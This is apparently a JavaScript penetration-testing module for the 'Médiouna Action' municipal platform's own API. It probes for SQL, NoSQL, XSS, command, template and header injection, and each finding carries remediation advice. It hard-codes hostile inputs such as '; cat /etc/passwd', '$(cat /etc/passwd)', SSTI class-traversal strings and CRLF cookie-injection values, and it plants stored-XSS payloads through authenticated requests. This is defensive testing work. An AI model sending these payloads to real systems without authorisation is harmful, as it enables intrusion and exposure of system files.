/**
 * ═══════════════════════════════════════════════════════════════════
 * INJECTION ATTACKS MODULE - MÉDIOUNA ACTION
 * Tests: SQL, NoSQL, XSS, Command Injection, SSTI, Header Injection
 * ═══════════════════════════════════════════════════════════════════
 */

import axios from 'axios';
import fs from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

export class InjectionAttacksModule {
  constructor(config) {
    this.config = config;
    this.tokens = {};
    this.axiosInstance = axios.create({
      timeout: config.timeout || 30000,
      validateStatus: () => true,
    });
  }

  async getToken(role) {
    if (this.tokens[role]) return this.tokens[role];
    const creds = this.config.credentials[role];
    if (!creds) return null;
    try {
      const res = await this.axiosInstance.post(`${this.config.apiBaseUrl}/auth/signin`, {
        email: creds.email,
        password: creds.password,
      });
      if (res.status === 200) {
        this.tokens[role] = res.data.token || res.data.accessToken;
        return this.tokens[role];
      }
    } catch (e) {}
    return null;
  }

  async loadPayloads(filename) {
    try {
      const content = await fs.readFile(path.join(__dirname, '..', 'payloads', filename), 'utf8');
      return JSON.parse(content);
    } catch (e) {
      return [];
    }
  }

  async sqlInjection() {
    console.log('  Testing SQL Injection...');
    const findings = [];
    const payloads = await this.loadPayloads('sql-injection.json');
    
    const endpoints = [
      { url: '/api/auth/signin', method: 'POST', field: 'email' },
      { url: '/api/etablissements', method: 'GET', field: 'search' },
      { url: '/api/reclamations', method: 'GET', field: 'communeId' },
    ];
    
    const sqlErrors = ['SQL syntax', 'mysql', 'PostgreSQL', 'SQLSTATE', 'sqlite', 'ORA-'];
    
    for (const ep of endpoints) {
      for (const payload of payloads.slice(0, 30)) {
        try {
          let res;
          if (ep.method === 'POST') {
            res = await this.axiosInstance.post(`${this.config.apiBaseUrl}${ep.url}`, {
              [ep.field]: payload,
              password: 'test',
            });
          } else {
            res = await this.axiosInstance.get(`${this.config.apiBaseUrl}${ep.url}`, {
              params: { [ep.field]: payload },
            });
          }
          
          const text = JSON.stringify(res.data);
          
          for (const err of sqlErrors) {
            if (text.toLowerCase().includes(err.toLowerCase())) {
              findings.push({
                severity: 'CRITICAL',
                category: 'SQL Injection',
                title: `SQLi dans ${ep.url}`,
                description: `Erreur SQL détectée: ${err}`,
                endpoint: ep.url,
                field: ep.field,
                payload: payload,
                remediation: 'Utiliser des requêtes paramétrées (Prisma)',
                cvss: 9.8,
                cwe: 'CWE-89',
                owasp: 'A03:2021',
              });
              break;
            }
          }
        } catch (e) {}
      }
    }
    
    return { findings };
  }

  async nosqlInjection() {
    console.log('  Testing NoSQL Injection...');
    const findings = [];
    const payloads = await this.loadPayloads('nosql-injection.json');
    
    const endpoints = [
      { url: '/api/auth/signin', method: 'POST', field: 'email' },
      { url: '/api/users', method: 'GET', field: 'email' },
    ];
    
    for (const ep of endpoints) {
      for (const payload of payloads.slice(0, 15)) {
        try {
          let res;
          if (ep.method === 'POST') {
            res = await this.axiosInstance.post(`${this.config.apiBaseUrl}${ep.url}`, {
              [ep.field]: payload,
              password: 'test',
            });
          } else {
            res = await this.axiosInstance.get(`${this.config.apiBaseUrl}${ep.url}`, {
              params: { [ep.field]: typeof payload === 'string' ? payload : JSON.stringify(payload) },
            });
          }
          
          if (res.status === 200 && Array.isArray(res.data) && res.data.length > 50) {
            findings.push({
              severity: 'HIGH',
              category: 'NoSQL Injection',
              title: `NoSQLi dans ${ep.url}`,
              description: `Payload a bypassé le filtre (${res.data.length} résultats)`,
              endpoint: ep.url,
              field: ep.field,
              payload: payload,
              remediation: 'Valider les entrées contre les opérateurs NoSQL',
              cvss: 8.6,
              cwe: 'CWE-943',
              owasp: 'A03:2021',
            });
            break;
          }
        } catch (e) {}
      }
    }
    
    return { findings };
  }

  async xssReflected() {
    console.log('  Testing Reflected XSS...');
    const findings = [];
    const payloads = await this.loadPayloads('xss-payloads.json');
    
    const endpoints = [
      { url: '/api/etablissements', field: 'search' },
      { url: '/search', field: 'q' },
    ];
    
    for (const ep of endpoints) {
      for (const payload of payloads.slice(0, 20)) {
        try {
          const res = await this.axiosInstance.get(`${this.config.target}${ep.url}`, {
            params: { [ep.field]: payload },
          });
          
          const text = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
          
          if (text.includes('<script>') || text.includes('onerror=') || text.includes('javascript:')) {
            findings.push({
              severity: 'MEDIUM',
              category: 'Reflected XSS',
              title: `XSS reflété dans ${ep.url}`,
              description: 'Payload XSS reflété sans sanitization',
              endpoint: ep.url,
              field: ep.field,
              payload: payload,
              remediation: 'Encoder les sorties HTML',
              cvss: 6.1,
              cwe: 'CWE-79',
              owasp: 'A03:2021',
            });
            break;
          }
        } catch (e) {}
      }
    }
    
    return { findings };
  }

  async xssStored() {
    console.log('  Testing Stored XSS...');
    const findings = [];
    const payloads = await this.loadPayloads('xss-payloads.json');
    
    const token = await this.getToken('citoyen');
    if (!token) return { findings };
    
    for (const payload of payloads.slice(0, 10)) {
      try {
        const res = await this.axiosInstance.post(
          `${this.config.apiBaseUrl}/reclamations`,
          {
            titre: payload,
            description: payload,
            categorie: 'INFRASTRUCTURE',
            communeId: 1,
            latitude: 33.5731,
            longitude: -7.5898,
          },
          { headers: { Authorization: `Bearer ${token}` } }
        );
        
        if (res.status === 201) {
          const text = JSON.stringify(res.data);
          
          if (text.includes('<script>') || text.includes('onerror=')) {
            findings.push({
              severity: 'HIGH',
              category: 'Stored XSS',
              title: 'XSS stocké dans réclamations',
              description: 'Payload XSS stocké dans la base de données',
              endpoint: '/reclamations',
              field: 'titre/description',
              payload: payload,
              remediation: 'Sanitizer les entrées avant stockage et encoder les sorties',
              cvss: 8.0,
              cwe: 'CWE-79',
              owasp: 'A03:2021',
            });
            break;
          }
        }
      } catch (e) {}
    }
    
    return { findings };
  }

  async xssDOM() {
    console.log('  Testing DOM-based XSS...');
    const findings = [];
    
    // DOM XSS nécessite un navigateur, test basique ici
    const domPayloads = [
      '#<script>alert(1)</script>',
      '?debug=<script>alert(1)</script>',
      '#onload=alert(1)',
    ];
    
    for (const payload of domPayloads) {
      try {
        const res = await this.axiosInstance.get(`${this.config.target}/${payload}`);
        
        if (res.status === 200) {
          const text = typeof res.data === 'string' ? res.data : '';
          
          if (text.includes('document.location') || text.includes('document.URL') || text.includes('innerHTML')) {
            findings.push({
              severity: 'INFO',
              category: 'DOM XSS Potential',
              title: 'Code JavaScript potentiellement vulnérable au DOM XSS',
              description: 'Le code utilise des APIs potentiellement dangereuses',
              endpoint: '/',
              payload: payload,
              remediation: 'Éviter d\'utiliser innerHTML et document.write',
              cvss: 0,
              cwe: 'CWE-79',
              owasp: 'A03:2021',
            });
          }
        }
      } catch (e) {}
    }
    
    return { findings };
  }

  async commandInjection() {
    console.log('  Testing Command Injection...');
    const findings = [];
    
    const payloads = [
      '; cat /etc/passwd',
      '| cat /etc/passwd',
      '`cat /etc/passwd`',
      '$(cat /etc/passwd)',
      '; whoami',
      '| whoami',
      '& dir',
      '| type C:\\windows\\system.ini',
    ];
    
    const endpoints = [
      { url: '/api/upload', field: 'filename' },
      { url: '/api/export', field: 'format' },
      { url: '/api/convert', field: 'type' },
    ];
    
    const indicators = ['root:', 'uid=', 'gid=', 'bin/bash', '[boot loader]'];
    
    for (const ep of endpoints) {
      for (const payload of payloads) {
        try {
          const res = await this.axiosInstance.post(`${this.config.apiBaseUrl}${ep.url}`, {
            [ep.field]: payload,
          });
          
          const text = JSON.stringify(res.data);
          
          for (const ind of indicators) {
            if (text.includes(ind)) {
              findings.push({
                severity: 'CRITICAL',
                category: 'Command Injection',
                title: `Injection de commande dans ${ep.url}`,
                description: `Exécution de commande détectée: ${ind}`,
                endpoint: ep.url,
                field: ep.field,
                payload: payload,
                remediation: 'Ne jamais passer d\'entrées utilisateur aux commandes shell',
                cvss: 9.8,
                cwe: 'CWE-78',
                owasp: 'A03:2021',
              });
              break;
            }
          }
        } catch (e) {}
      }
    }
    
    return { findings };
  }

  async sstiTests() {
    console.log('  Testing Server-Side Template Injection...');
    const findings = [];
    
    const payloads = [
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '#{7*7}',
      '*{7*7}',
      '{{constructor.constructor("return this")()}}',
      '{{config}}',
      '{{self.__class__.__mro__[2].__subclasses__()}}',
    ];
    
    const endpoints = [
      { url: '/api/templates/render', field: 'content' },
      { url: '/api/emails/preview', field: 'body' },
    ];
    
    for (const ep of endpoints) {
      for (const payload of payloads) {
        try {
          const res = await this.axiosInstance.post(`${this.config.apiBaseUrl}${ep.url}`, {
            [ep.field]: payload,
          });
          
          const text = JSON.stringify(res.data);
          
          if (text.includes('49') || text.includes('[')) {
            findings.push({
              severity: 'CRITICAL',
              category: 'SSTI',
              title: `SSTI dans ${ep.url}`,
              description: `Template injecté et évalué: ${payload}`,
              endpoint: ep.url,
              field: ep.field,
              payload: payload,
              remediation: 'Utiliser des templates sécurisés avec autoescaping',
              cvss: 9.0,
              cwe: 'CWE-94',
              owasp: 'A03:2021',
            });
            break;
          }
        } catch (e) {}
      }
    }
    
    return { findings };
  }

  async headerInjection() {
    console.log('  Testing Header Injection...');
    const findings = [];
    
    const payloads = [
      '%0d%0aSet-Cookie:%20admin=true',
      '\r\nX-Injected: true',
      '%0d%0aX-Injected: true',
    ];
    
    for (const payload of payloads) {
      try {
        const res = await this.axiosInstance.get(`${this.config.apiBaseUrl}/redirect?url=${encodeURIComponent(payload)}`);
        
        const setCookie = res.headers['set-cookie'];
        const xInjected = res.headers['x-injected'];
        
        if ((setCookie && setCookie.some(c => c.includes('admin=true'))) || xInjected) {
          findings.push({
            severity: 'HIGH',
            category: 'Header Injection',
            title: 'Injection de header HTTP',
            description: 'Entrée utilisateur injectée dans les headers HTTP',
            endpoint: '/redirect',
            payload: payload,
            remediation: 'Sanitizer les entrées avant de les utiliser dans les headers',
            cvss: 7.5,
            cwe: 'CWE-113',
            owasp: 'Header Injection',
          });
          break;
        }
      } catch (e) {}
    }
    
    return { findings };
  }
}
